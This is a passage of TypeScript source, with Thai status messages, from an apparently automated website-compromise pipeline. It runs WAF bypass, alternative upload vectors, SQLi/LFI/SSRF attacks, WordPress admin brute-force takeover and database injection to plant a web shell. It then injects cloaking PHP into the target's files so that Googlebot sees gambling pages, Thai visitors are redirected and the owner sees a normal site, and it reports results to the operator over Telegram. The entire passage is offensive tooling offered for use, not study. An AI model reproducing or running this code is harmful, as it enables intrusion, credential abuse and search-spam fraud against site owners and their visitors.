          aiDecisions.push(`✅ WAF bypass success: ${wafSuccess.method} → ${wafSuccess.fileUrl}`);
          const verification = await verifyUploadedFile(wafSuccess.fileUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: wafSuccess.fileUrl,
            shell: bestShell,
            method: `waf_bypass_${wafSuccess.method}`,
            verified: verification.verified,
            redirectWorks: verification.redirectWorks,
            httpStatus: verification.httpStatus,
          });
        }

        onEvent({
          phase: "waf_bypass",
          step: "complete",
          detail: `✅ WAF bypass เสร็จ — ${wafBypassResults.filter(r => r.success).length}/${wafBypassResults.length} methods สำเร็จ`,
          progress: 86,
        });
      } catch (error: any) {
        errors.push(`WAF bypass failed: ${error.message}`);
      }
    }

    // 4.5b: Alternative Upload Vectors
    if (config.enableAltUpload !== false && !uploadedFiles.some(f => f.redirectWorks)) {
      try {
        onEvent({
          phase: "alt_upload",
          step: "start",
          detail: `📡 Phase 4.5b: Alt Upload — XML-RPC, REST API, WebDAV, FTP, cPanel, Git exploit...`,
          progress: 87,
        });

        // Build credentials from discovered config exploits
        const wpCreds = discoveredCredentials.find((c: any) => c.type === "wordpress" || c.type === "wp");
        const ftpCreds = discoveredCredentials.filter((c: any) => c.type === "ftp").map((c: any) => ({ username: c.username || "", password: c.password || "" }));

        altUploadResults = await Promise.race([
          runAllAltUploadVectors({
            targetUrl: targetForAdvanced,
            fileContent: shellContent,
            filename: bestShell.filename,
            wpCredentials: wpCreds ? { username: wpCreds.username || "", appPassword: wpCreds.password || "" } : undefined,
            ftpCredentials: ftpCreds.length > 0 ? ftpCreds : undefined,
            timeout: config.timeoutPerMethod || 30000,
            onProgress: (vector: string, detail: string) => {
              onEvent({
                phase: "alt_upload",
                step: vector,
                detail: `📡 ${detail}`,
                progress: 89,
              });
            },
          }),
          new Promise<AltUploadResult[]>((_, reject) => setTimeout(() => reject(new Error("alt upload timeout")), 90000)),
        ]);

        const altSuccess = altUploadResults.find(r => r.success && r.fileUrl);
        if (altSuccess && altSuccess.fileUrl) {
          aiDecisions.push(`✅ Alt upload success: ${altSuccess.vector} → ${altSuccess.fileUrl}`);
          const verification = await verifyUploadedFile(altSuccess.fileUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: altSuccess.fileUrl,
            shell: bestShell,
            method: `alt_${altSuccess.vector}`,
            verified: verification.verified,
            redirectWorks: verification.redirectWorks,
            httpStatus: verification.httpStatus,
          });
        }

        onEvent({
          phase: "alt_upload",
          step: "complete",
          detail: `✅ Alt upload เสร็จ — ${altUploadResults.filter(r => r.success).length}/${altUploadResults.length} methods สำเร็จ`,
          progress: 91,
        });
      } catch (error: any) {
        errors.push(`Alt upload failed: ${error.message}`);
      }
    }

    // 4.5c: Indirect Attacks (SQLi, LFI, SSRF, Log Poisoning)
    if (config.enableIndirectAttacks !== false && !uploadedFiles.some(f => f.redirectWorks)) {
      try {
        onEvent({
          phase: "indirect",
          step: "start",
          detail: `💉 Phase 4.5c: Indirect Attacks — SQLi File Write, LFI/RFI, Log Poisoning, SSRF...`,
          progress: 92,
        });

        indirectResults = await Promise.race([
          runIndirectAttacks({
            targetUrl: targetForAdvanced,
            shellContent,
            shellFilename: bestShell.filename,
            redirectUrl: config.redirectUrl,
            timeout: config.timeoutPerMethod || 30000,
            onProgress: (vector: string, detail: string) => {
              onEvent({
                phase: "indirect",
                step: vector,
                detail: `💉 ${detail}`,
                progress: 94,
              });
            },
          }),
          new Promise<IndirectAttackResult[]>((_, reject) => setTimeout(() => reject(new Error("indirect attacks timeout")), 120000)),
        ]);

        const indirectSuccess = indirectResults.find(r => r.success && r.fileUrl);
        if (indirectSuccess && indirectSuccess.fileUrl) {
          aiDecisions.push(`✅ Indirect attack success: ${indirectSuccess.vector} → ${indirectSuccess.fileUrl}`);
          const verification = await verifyUploadedFile(indirectSuccess.fileUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: indirectSuccess.fileUrl,
            shell: bestShell,
            method: `indirect_${indirectSuccess.vector}`,
            verified: verification.verified,
            redirectWorks: verification.redirectWorks,
            httpStatus: verification.httpStatus,
          });
        }

        onEvent({
          phase: "indirect",
          step: "complete",
          detail: `✅ Indirect attacks เสร็จ — ${indirectResults.filter(r => r.success).length}/${indirectResults.length} methods สำเร็จ`,
          progress: 96,
        });
      } catch (error: any) {
        errors.push(`Indirect attacks failed: ${error.message}`);
      }
    }
  }

  // ─── Phase 4.6: WP Admin Takeover + DB Injection (non-upload fallback) ───
  let wpAdminResults: WpTakeoverResult[] = [];
  let wpDbInjectionResults: WpDbInjectionResult[] = [];

  if (!uploadedFiles.some(f => f.redirectWorks)) {
    // 4.6a: WP Admin Takeover (brute force → theme/plugin editor → XMLRPC → REST API)
    if (config.enableWpAdminTakeover !== false) {
      try {
        onEvent({
          phase: "wp_admin",
          step: "start",
          detail: `🔐 Phase 4.6a: WP Admin Takeover — Brute Force + Theme/Plugin Editor + XMLRPC + REST API...`,
          progress: 96,
        });

        const wpAdminConfig: WpAdminConfig = {
          targetUrl: config.targetUrl,
          redirectUrl: config.redirectUrl,
          seoKeywords: config.seoKeywords,
          timeout: config.timeoutPerMethod || 30000,
          knownCredentials: discoveredCredentials
            .filter((c: any) => c.username && c.password)
            .map((c: any) => ({ username: c.username, password: c.password })),
          onProgress: (method: string, detail: string) => {
            onEvent({
              phase: "wp_admin",
              step: method,
              detail: `🔐 ${detail}`,
              progress: 97,
            });
          },
        };

        wpAdminResults = await Promise.race([
          runWpAdminTakeover(wpAdminConfig),
          new Promise<WpTakeoverResult[]>((_, reject) => setTimeout(() => reject(new Error("WP admin takeover timeout")), 120000)),
        ]);

        const wpSuccess = wpAdminResults.find(r => r.success);
        if (wpSuccess) {
          aiDecisions.push(`✅ WP Admin Takeover success: ${wpSuccess.method} — ${wpSuccess.detail}`);

          // Mark as uploaded file for cloaking phase
          uploadedFiles.push({
            url: wpSuccess.injectedUrl || config.targetUrl,
            shell: shells[0] || { id: "wp_admin", type: "wp_admin_inject" as any, filename: "functions.php", content: "", size: 0, mimeType: "text/plain", headers: {} },
            method: `wp_admin_${wpSuccess.method}`,
            verified: true,
            redirectWorks: true,
            httpStatus: 200,
          });

          onEvent({
            phase: "wp_admin",
            step: "success",
            detail: `✅ WP Admin Takeover สำเร็จ: ${wpSuccess.method} — ${wpSuccess.detail}`,
            progress: 97,
            data: { wpAdminResults },
          });
        } else {
          onEvent({
            phase: "wp_admin",
            step: "complete",
            detail: `⚠️ WP Admin Takeover ล้มเหลว — ลอง ${wpAdminResults.length} methods`,
            progress: 97,
            data: { wpAdminResults },
          });
        }
      } catch (error: any) {
        errors.push(`WP Admin Takeover failed: ${error.message}`);
        onEvent({
          phase: "wp_admin",
          step: "error",
          detail: `⚠️ WP Admin Takeover error: ${error.message}`,
          progress: 97,
        });
      }
    }

    // 4.6b: WP Database Injection (SQLi → wp_options/wp_posts/widgets/.htaccess/cPanel)
    if (config.enableWpDbInjection !== false && !uploadedFiles.some(f => f.redirectWorks)) {
      try {
        onEvent({
          phase: "wp_db_inject",
          step: "start",
          detail: `💉 Phase 4.6b: WP DB Injection — SQLi wp_options/wp_posts, .htaccess, cPanel takeover...`,
          progress: 98,
        });

        // Find SQLi endpoint from indirect attack results
        const sqliResult = indirectResults.find(r => r.vector === "sqli_file_write" && r.success);
        // Parse SQLi info from evidence string if available
        const sqliEvidence = sqliResult?.evidence || "";
        const sqliEndpointMatch = sqliEvidence.match(/endpoint:\s*(\S+)/);
        const sqliParamMatch = sqliEvidence.match(/param:\s*(\S+)/);

        const wpDbConfig: WpDbInjectionConfig = {
          targetUrl: config.targetUrl,
          redirectUrl: config.redirectUrl,
          seoKeywords: config.seoKeywords,
          timeout: config.timeoutPerMethod || 30000,
          sqliEndpoint: sqliEndpointMatch?.[1] || (sqliResult?.fileUrl ? sqliResult.fileUrl : undefined),
          sqliParam: sqliParamMatch?.[1] || "id",
          sqliType: sqliEvidence.includes("time") ? "time" as const : sqliEvidence.includes("union") ? "union" as const : "error" as const,
          onProgress: (method: string, detail: string) => {
            onEvent({
              phase: "wp_db_inject",
              step: method,
              detail: `💉 ${detail}`,
              progress: 98,
            });
          },
        };

        wpDbInjectionResults = await Promise.race([
          runWpDbInjection(wpDbConfig),
          new Promise<WpDbInjectionResult[]>((_, reject) => setTimeout(() => reject(new Error("WP DB injection timeout")), 120000)),
        ]);

        const dbSuccess = wpDbInjectionResults.find(r => r.success);
        if (dbSuccess) {
          aiDecisions.push(`✅ WP DB Injection success: ${dbSuccess.method} — ${dbSuccess.detail}`);

          uploadedFiles.push({
            url: dbSuccess.injectedUrl || config.targetUrl,
            shell: shells[0] || { id: "wp_db", type: "wp_db_inject" as any, filename: "wp_options", content: "", size: 0, mimeType: "text/plain", headers: {} },
            method: `wp_db_${dbSuccess.method}`,
            verified: true,
            redirectWorks: true,
            httpStatus: 200,
          });

          onEvent({
            phase: "wp_db_inject",
            step: "success",
            detail: `✅ WP DB Injection สำเร็จ: ${dbSuccess.method} — ${dbSuccess.detail}`,
            progress: 98,
            data: { wpDbInjectionResults },
          });
        } else {
          onEvent({
            phase: "wp_db_inject",
            step: "complete",
            detail: `⚠️ WP DB Injection ล้มเหลว — ลอง ${wpDbInjectionResults.length} methods`,
            progress: 98,
            data: { wpDbInjectionResults },
          });
        }
      } catch (error: any) {
        errors.push(`WP DB Injection failed: ${error.message}`);
        onEvent({
          phase: "wp_db_inject",
          step: "error",
          detail: `⚠️ WP DB Injection error: ${error.message}`,
          progress: 98,
        });
      }
    }
  }

  // ─── Phase 4.9: Cloaking (ONLY if upload succeeded) ───
  let injectionResult: InjectionResult | null = null;
  let cdnUploadResult: CdnUploadResult | null = null;

  if (config.enableCloaking !== false && uploadedFiles.length > 0) {
    try {
      onEvent({
        phase: "cloaking",
        step: "content_gen",
        detail: "🎭 Phase 4.9: Cloaking — AI สร้าง SEO gambling content (หลังวางไฟล์สำเร็จแล้ว)...",
        progress: 92,
      });

      // Step 1: Generate content pack
      const contentConfig: ContentConfig = {
        primaryKeyword: config.seoKeywords[0] || "สล็อต",
        keywords: config.seoKeywords,
        brandName: config.cloakingBrand || "SlotXO",
        redirectUrl: config.redirectUrl,
        language: "th",
        contentType: config.cloakingContentType || "landing",
      };

      contentPack = await generateContentPack(contentConfig, (detail) => {
        onEvent({ phase: "cloaking", step: "content_gen", detail, progress: 93 });
      });

      // Step 2: Upload content to CDN (external hosting)
      onEvent({
        phase: "cloaking",
        step: "cdn_upload",
        detail: "☁️ อัพโหลด gambling content ไป CDN (content ไม่เก็บบน target)...",
        progress: 94,
      });

      try {
        const targetDomain = new URL(config.targetUrl).hostname;
        cdnUploadResult = await uploadContentToCdn({
          primaryKeyword: config.seoKeywords[0] || "สล็อต",
          keywords: config.seoKeywords,
          brandName: config.cloakingBrand || "SlotXO",
          redirectUrl: config.redirectUrl,
          targetDomain,
          htmlContent: contentPack.mainPage.fullHtml,
          doorwayPages: contentPack.doorwayPages.map(dp => ({ slug: dp.internalLinks[0]?.slug || dp.title.toLowerCase().replace(/\s+/g, "-"), html: dp.fullHtml })),
        });

        onEvent({
          phase: "cloaking",
          step: "cdn_upload",
          detail: `✅ CDN upload สำเร็จ — ${cdnUploadResult.allUrls.length} ไฟล์, landing: ${cdnUploadResult.mainPageUrl}`,
          progress: 95,
          data: { cdnBaseUrl: cdnUploadResult.contentKeyPrefix, landingUrl: cdnUploadResult.mainPageUrl },
        });
      } catch (cdnErr: any) {
        onEvent({
          phase: "cloaking",
          step: "cdn_upload",
          detail: `⚠️ CDN upload ล้มเหลว: ${cdnErr.message} — ใช้ inline content แทน`,
          progress: 95,
        });
      }

      // Step 3: Generate cloaking shell (with CDN URL if available)
      const cloakingConfig: CloakingConfig = {
        redirectUrl: config.redirectUrl,
        primaryKeyword: config.seoKeywords[0] || "สล็อต",
        keywords: config.seoKeywords,
        brandName: config.cloakingBrand || "SlotXO",
        language: "th",
        cdnBaseUrl: cdnUploadResult?.mainPageUrl,
        geoTargetCountries: ["TH", "VN", "ID", "MY", "PH", "KH", "LA", "MM"],
      };

      cloakingResult = await generateCloakingPackage(cloakingConfig, (detail) => {
        onEvent({ phase: "cloaking", step: "shell_gen", detail, progress: 96 });
      });

      aiDecisions.push(`Cloaking shell generated: ${cloakingResult.type} (${cloakingResult.internalPages.length} internal pages)`);

      // Step 4: Inject cloaking code into existing PHP files on target
      const activeShellUrl = uploadedFiles.find(f => f.verified)?.url || uploadedFiles[0]?.url;
      if (activeShellUrl) {
        onEvent({
          phase: "cloaking",
          step: "injection",
          detail: "💉 Inject cloaking code เข้าไฟล์ PHP เดิมบน target...",
          progress: 97,
        });

        try {
          const injectionConfig: InjectionConfig = {
            shellUrl: activeShellUrl,
            contentCdnUrl: cdnUploadResult?.mainPageUrl || "",
            redirectUrl: config.redirectUrl,
            primaryKeyword: config.seoKeywords[0] || "สล็อต",
            keywords: config.seoKeywords,
            brandName: config.cloakingBrand || "SlotXO",
            geoTargetCountries: ["TH", "VN", "ID", "MY", "PH", "KH", "LA", "MM"],
          };

          injectionResult = await executeInjection(injectionConfig, (detail) => {
            onEvent({ phase: "cloaking", step: "injection", detail, progress: 98 });
          });

          if (injectionResult.injectedFiles.length > 0) {
            aiDecisions.push(`PHP injection สำเร็จ: ${injectionResult.injectedFiles.length} ไฟล์ถูก inject`);
            onEvent({
              phase: "cloaking",
              step: "injection",
              detail: `✅ Inject สำเร็จ! ${injectionResult.injectedFiles.length} ไฟล์ PHP ถูก inject cloaking code — เจ้าของเว็บเห็นเว็บปกติ, Googlebot เห็น gambling page, คนไทยโดน redirect`,
              progress: 98,
              data: { injectedFiles: injectionResult.injectedFiles.length, files: injectionResult.injectedFiles },
            });
          } else {
            onEvent({
              phase: "cloaking",
              step: "injection",
              detail: `⚠️ Inject ไม่สำเร็จ — ไม่พบไฟล์ PHP ที่เขียนได้ หรือ shell ไม่รองรับ file_put_contents`,
              progress: 98,
            });
          }
        } catch (injErr: any) {
          onEvent({
            phase: "cloaking",
            step: "injection",
            detail: `⚠️ Injection ล้มเหลว: ${injErr.message}`,
            progress: 98,
          });
        }
      }

      onEvent({
        phase: "cloaking",
        step: "complete",
        detail: `✅ Cloaking สร้างเสร็จ — ${cloakingResult.type} + ${contentPack.doorwayPages.length} doorway pages${injectionResult?.injectedFiles ? ` + ${injectionResult.injectedFiles} files injected` : ""}${cdnUploadResult ? " + CDN hosted" : ""}`,
        progress: 99,
        data: {
          shellType: cloakingResult.type,
          internalPages: cloakingResult.internalPages.length,
          doorwayPages: contentPack.doorwayPages.length,
          contentSize: cloakingResult.content.length,
          injectedFiles: injectionResult?.injectedFiles?.length || 0,
          cdnUrl: cdnUploadResult?.contentKeyPrefix,
        },
      });
    } catch (error: any) {
      errors.push(`Cloaking generation failed: ${error.message}`);
      onEvent({
        phase: "cloaking",
        step: "error",
        detail: `⚠️ Cloaking ล้มเหลว: ${error.message} — ไฟล์ที่วางได้ยังใช้งานได้ปกติ`,
        progress: 99,
      });
    }
  } else if (config.enableCloaking !== false && uploadedFiles.length === 0) {
    onEvent({
      phase: "cloaking",
      step: "skipped",
      detail: `⏭️ Cloaking ข้าม — ยังไม่มีไฟล์ที่วางสำเร็จ ไม่จำเป็นต้องสร้าง doorway pages`,
      progress: 99,
    });
  }

  // ─── Emit final world state ───
  onEvent({
    phase: "world_update",
    step: "final",
    detail: "Final world state",
    progress: 99,
    data: {
      hosts: 1,
      ports: 0,
      vulns: (vulnScan?.misconfigurations?.length || 0) + (configResults?.filter(r => r.success).length || 0),
      creds: discoveredCredentials?.length || 0,
      uploadPaths: vulnScan?.writablePaths?.length || prescreen?.writablePaths?.length || 0,
      shellUrls: uploadedFiles.filter(f => f.verified).length,
      deployedFiles: uploadedFiles.length,
      verifiedUrls: uploadedFiles.filter(f => f.redirectWorks).length,
    },
  });

  // ─── Phase 5: Final Result ───
  const verifiedFiles = uploadedFiles.filter(f => f.verified);
  const redirectWorkingFiles = uploadedFiles.filter(f => f.redirectWorks);
  const success = redirectWorkingFiles.length > 0 || verifiedFiles.length > 0;

  const result: PipelineResult = {
    success,
    targetUrl: config.targetUrl,
    redirectUrl: config.redirectUrl,
    prescreen,
    vulnScan,
    shellsGenerated: shells.length,
    uploadAttempts: totalAttempts,
    uploadedFiles,
    verifiedFiles,
    totalDuration: Date.now() - startTime,
    aiDecisions,
    errors,
    // Advanced attack results
    wafBypassResults: wafBypassResults.length > 0 ? wafBypassResults : undefined,
    altUploadResults: altUploadResults.length > 0 ? altUploadResults : undefined,
    indirectAttackResults: indirectResults.length > 0 ? indirectResults : undefined,
    dnsAttackResults: dnsResults.length > 0 ? dnsResults : undefined,
    configExploitResults: configResults.length > 0 ? configResults : undefined,
    originIp,
    discoveredCredentials: discoveredCredentials.length > 0 ? discoveredCredentials : undefined,
    // WP Admin Takeover & DB Injection results
    wpAdminResults: wpAdminResults.length > 0 ? wpAdminResults : undefined,
    wpDbInjectionResults: wpDbInjectionResults.length > 0 ? wpDbInjectionResults : undefined,
    // Cloaking results
    cloakingShell: cloakingResult || undefined,
    contentPack: contentPack || undefined,
    // Injection & CDN results
    injectionResult: injectionResult || undefined,
    cdnUploadResult: cdnUploadResult || undefined,
  };

  if (success) {
    onEvent({
      phase: "complete",
      step: "success",
      detail: `🎉 Pipeline สำเร็จ! ${verifiedFiles.length} ไฟล์ verified, ${redirectWorkingFiles.length} redirects ทำงาน (${Math.round(result.totalDuration / 1000)}s)`,
      progress: 100,
      data: result,
    });
  } else {
    onEvent({
      phase: "complete",
      step: "failed",
      detail: `❌ Pipeline ล้มเหลว — ลอง ${totalAttempts} ครั้ง, ${shells.length} shells, ${errors.length} errors (${Math.round(result.totalDuration / 1000)}s)`,
      progress: 100,
      data: result,
    });
  }

  // ─── Telegram Notification ───
  try {
    const deployedUrls = uploadedFiles.map(f => f.url);
    const telegramPayload: TelegramNotification = {
      type: success ? "success" : (uploadedFiles.length > 0 ? "partial" : "failure"),
      targetUrl: config.targetUrl,
      redirectUrl: config.redirectUrl,
      deployedUrls,
      shellType: shells[0]?.type || "unknown",
      duration: result.totalDuration,
      errors: errors.slice(0, 5),
      keywords: config.seoKeywords,
      cloakingEnabled: config.enableCloaking !== false && !!cloakingResult,
      injectedFiles: injectionResult?.injectedFiles?.length || 0,
      details: success
        ? `${verifiedFiles.length} verified, ${injectionResult?.injectedFiles?.length || 0} injected, ${cdnUploadResult ? "CDN hosted" : "inline content"}`
        : `${totalAttempts} attempts, ${errors.length} errors`,
    };

    const telegramResult = await sendTelegramNotification(telegramPayload);
    result.telegramSent = telegramResult.success;

    if (telegramResult.success) {
      onEvent({
        phase: "complete",
        step: "telegram",
        detail: `📩 Telegram แจ้งเตือนแล้ว`,
        progress: 100,
      });
    }
  } catch (tgErr: any) {
    // Non-critical — don't fail pipeline for notification errors
    onEvent({
      phase: "complete",
      step: "telegram",
      detail: `⚠️ Telegram ส่งไม่ได้: ${tgErr.message}`,
      progress: 100,
    });
  }

  return result;
}
